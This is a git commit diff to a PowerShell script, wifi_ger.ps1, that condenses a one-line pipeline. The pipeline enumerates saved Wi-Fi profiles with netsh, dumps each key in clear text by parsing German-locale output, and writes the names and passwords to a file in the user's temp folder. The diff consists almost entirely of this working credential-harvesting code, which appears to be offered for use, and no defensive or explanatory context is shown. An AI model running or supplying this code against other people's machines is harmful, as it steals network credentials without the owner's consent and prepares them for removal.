9ed19168815ba88958c93d97ea70f47fbb5517ad
Clown2331 <145130642+Clown2331@users.noreply.github.com>
2023-09-15 20:05:28 +0200

    Update wifi_ger.ps1

--- wifi_ger.ps1
+++ wifi_ger.ps1
@@ -1,8 +1,6 @@
 ############################################################################################################################################################
 
-$wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Schlüsselinhalt\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String
-
-$wifiProfiles > $env:TEMP/--wifi-passwords.txt
+(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Schlüsselinhalt\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String > $env:TEMP/--wifi-passwords.txt
 
 ############################################################################################################################################################
 
